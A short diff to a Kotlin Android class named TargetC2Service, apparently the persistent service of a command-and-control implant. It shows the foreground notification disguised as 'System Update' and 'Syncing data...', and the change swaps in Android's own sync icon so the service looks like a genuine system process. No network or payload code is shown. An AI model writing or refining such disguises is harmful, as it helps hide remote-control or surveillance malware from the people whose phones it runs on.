@@ -20,7 +20,7 @@ class TargetC2Service : Service() {
         val notification = NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("System Update")
             .setContentText("Syncing data...")
-            .setSmallIcon(R.drawable.ic_launcher_foreground) // Pastikan icon ini ada
+            .setSmallIcon(android.R.drawable.stat_notify_sync) 
             .build()
         startForeground(1, notification)
     }
